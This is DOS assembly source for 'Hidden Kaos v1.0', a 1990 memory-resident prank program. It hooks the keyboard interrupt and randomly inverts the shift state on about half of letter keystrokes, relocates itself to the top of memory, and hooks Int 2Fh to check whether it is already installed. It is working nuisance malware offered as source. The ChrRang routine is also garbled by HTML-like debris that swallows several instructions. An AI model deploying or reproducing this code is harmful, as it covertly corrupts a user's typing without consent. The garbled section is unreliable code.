

  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                          Hidden Kaos v1.0                            ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ        Copyright (C) 1990  Philip Maland  All Rights Reserved        ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                        Created:  June 3, 1990                        ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
  
Seg_a		Segment
		Assume	cs:Seg_A, ds:Seg_A
  
  
		org	100h
  
Start:
		jmp	Install			; Go to installation routine

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ  Int 09h - New Handler                                               ÛÛ   
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

Int_09:
		push	ax			; Save the world
		push	bx
		push	cx
		push	dx
		push	es
		pushf

		in	al,60h			; Get scan of code key pressed
						; into AL
		mov	bl,32h			; High char to check ('Z')
		mov	bh,10h			; Low char to check  ('A')
		call	ChrRang			; Is AL between 'Z' and 'A'?
		jc	End_09			; No, it isn't an alpha key

		mov	bl,1Dh			; High char
		mov	bh,1Ah			; Low char
		call	ChrRang			; Since we are using scan codes
						; there are some keys between
						; 'A' and 'Z' that aren't alpha
						; keys.  This check for one
						; set of non-alpha keys.

		jnc	End_09			; Yes, it isn't an alpha key

		mov	bl,2Bh			; High char
		mov	bh,27h			; Low char
		call	ChrRang			; This checks for the other set
						; of non-alpha keys.

		jnc	End_09			; Yes, it is in this set, so it
						; isn't an alpha key.
		
		mov	ax,10			; Get random number between 1
		push	ax			; and 10 and push it on the stack
		call	Random			; Random number between 1 and 
						; 10 is returned in AX
		cmp	ax,5			; Is the number greater than 5?
		jg	End_09			; Yes, so leave the key alone

		mov	ax,0			; Point ES to low memory (0000)
		mov	es,ax
		mov	al,byte ptr es:[417h]	; Get shift flags
		test	al,3			; Are any of the shift keys pressed?
		jz	SetShift		; If not, turn on the shift flag
						; for the right shift key.
;Û
;  Here we know a shift key is pressed.
;Û
		mov	cs:SaveShift,al		; Save the shift flags

		and	byte ptr es:[417h],11111100b	; Clear the shift key
							; flags.
		jmp	CallRest

SetShift:
		mov	cs:SaveShift,al		; Save the shift flags
		or	byte ptr es:[417h],01	; Set the right shift key flag
		jmp	CallRest

CallRest:
		popf				; Restore all registers
		pop	es			; and call the Int 09h handler
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pushf
		call	dword ptr cs:[Old_09_Ofs]

		push	ax			; Save the regs were gonna use
		push	es
		pushf

		mov	ax,0			; Point ES to low memory again
		mov	es,ax
		mov	al,cs:SaveShift		; Get the saved flags
		mov	byte ptr es:[417h],al	; Restore them back to the
						; flag status byte in low memory.

		popf				; Restore the registers
		pop	es
		pop	ax
		iret				; Return from the interrupt

End_09:
		popf				; Restore all registers
		pop	es
		pop	dx
		pop	cx
		pop	bx
		pop	ax
						; Jump to the old Int 09
						; handler
		db	0EAh
Old_09_Ofs	dw	0
Old_09_Seg	dw	0

SaveShift	db	0			; Byte to save flags to

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                         ÛÛ
;ÛÛ   Procedure:  ChrRang                                                   ÛÛ
;ÛÛ                                                                         ÛÛ
;ÛÛ   Call to test if a character is between or included by two characters  ÛÛ
;ÛÛ                                                                         ÛÛ
;ÛÛ     To Call:     AL = Char to check                                     ÛÛ
;ÛÛ                  BL = upper match char                                  ÛÛ
;ÛÛ                  BH = low match char                                    ÛÛ
;ÛÛ        Exit:     CF clear if valid match                                ÛÛ
;ÛÛ                  BL = undefined                                         ÛÛ
;ÛÛ                       all other registers unchanged                     ÛÛ
;ÛÛ                                                                         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

ChrRang:
		cmp	al,bh		; Is the char < bh="" jc="" chrrng1="" ;="" yes,="" no="" match,="" return="" with="" carry="" inc="" bl="" ;="" is="" the="" char=""> BL
		cmp	al,bl		; Compare with upper limit
		cmc			; Invert the carry flag
ChrRng1:
		ret

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                         ÛÛ
;ÛÛ   Procedure:  Random                                                    ÛÛ
;ÛÛ                                                                         ÛÛ
;ÛÛ     To Call:     SP + 4 = High number for random generator              ÛÛ
;ÛÛ                                                                         ÛÛ
;ÛÛ        Exit:     AX = Random number between 0 and AX                    ÛÛ
;ÛÛ                                                                         ÛÛ
;ÛÛ                  (Taken from Turbo Pascal Random() function)            ÛÛ
;ÛÛ                                                                         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

Random:
		call	Rnd2
		xor	ax,ax
		mov	bx,sp
		mov	bx,ss:[bx+2]
		or	bx,bx
		jz	RndEnd
		xchg	ax,dx
		div	bx
		xchg	ax,dx
  
RndEnd:
		ret	2

Rnd2:
		mov	ax,cs:Data_3
		mov	bx,cs:Data_4
		mov	cx,ax
		mul	cs:data_29
		shl	cx,1
		shl	cx,1
		shl	cx,1
		add	ch,cl
		add	dx,cx
		add	dx,bx
		shl	bx,1
		shl	bx,1
		add	dx,bx
		add	dh,bl
		mov	cl,5
		shl	bx,cl
		add	dh,bl
		add	ax,1
		adc	dx,0
		mov	cs:Data_3,ax
		mov	cs:Data_4,dx
		ret

Data_29		dw	8405h

Data_3		dw	0
Data_4		dw	0

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ  Int 2Fh - New Handler                                               ÛÛ   
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

Int_2F:
		cmp	ah,0E0h			; Is this call for us?
		jne	Continue		; No, Continue with old Int 2Fh
		cmp	al,00h			; Yes, Is it an installation
		jne	Continue		;   check?  No, Continue.
		mov	al,0FFh			; Yes, set al to FFh 
		iret				; Interrupt Return
	
Continue:
						; If not for us, go on
						;   to old Int 2Fh.
		db	0EAh
Old_2F_Ofs	dw	?			; Old Int 2Fh Offset
Old_2F_Seg	dw	?			; Old Int 2Fh Segment


;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ  Installation Routine                                                ÛÛ   
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

Install:
		mov	ax,0E000h		; Call Int 2F to check for 
		int	2Fh			;   re-installation
		cmp	al,0FFh			; Is it already installed?
		je	Installed		; Yes, Print message and quit
		mov	ax,352Fh		; No, Get old Int 2F to point 
		int	21h			;   to our Int 2F handler.
		mov	Old_2F_Ofs,bx		; Save Old Offset
		mov	Old_2F_Seg,es		; Save Old Segment

		mov	ax,3509h		; Get old Int 09 vector
		int	21h
		mov	Old_09_Ofs,bx		; Save Old Offset
		mov	Old_09_Seg,es		; Save Old Segment

		call	Randomize		; Get random number seed
						; (based on the time)

		mov	ax,cs			; Point ES to the memory
		sub	ax,0001			; control block for this 
		mov	es,ax			; program (KaosKeys).

		mov	ax,word ptr es:[0003]	; Get the size of the memory
		sub	ax,25h			; block (in paragraphs), and
						; subtract 25h paragraphs from
						; it (592 bytes).
 
		mov	word ptr es:[0003],ax	; Replace block size with
						; the smaller value

		mov	si,word ptr es:[0012h]	; Get amount of memory in the
						; machine (in paragraphs). 
						; A000 is 640k

		sub	si,25h			; Subtract 25h paragraphs from
						; it.
		mov	es,si			; Make that the ES
		mov	si,0			; Point SI and DI to Offset 0
		mov	di,0

		mov	cx,500h			; Move 500h bytes to ES:DI
		rep	movsb			; which is (A000-25:0) from
						; DS:SI which is CS:0

		push	es			; Set DS equal to ES (which
		pop	ds			; points to the segment where
						; we just moved the entire 
						; program to)

		mov	ax,252Fh		; Set Int 2F vector to point
		mov	dx,offset Int_2F	; to our handler at Int_2F
						; up towards the top of memory 
		int	21h			; Set it.

		mov	ax,2509h		; Set keyboard vector to point
		mov	dx,offset Int_09	; to our handler up towards the
						; top of memory
		int	21h			; Set it.

		int	20h			; And quit normally.

Installed:	
		mov	ah,09			; Print string until '$' or 24h
		mov	dx,offset Message	; Print data at Message.
		int	21h			; Print it
		int	20h			; Quit

Randomize:
		mov	ah,2Ch
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dh=sec
		mov	cs:Data_3,cx
		mov	cs:Data_4,dx
		ret
  
Message		db	'Hidden Kaos - Copyright (C) 1990 - By Philip Maland',00h
		db	0Ah,0Dh,0Ah,0Dh,'Already installed.',0Ah,0Dh,24h

Seg_A		ends
  
  
  
		end	Start


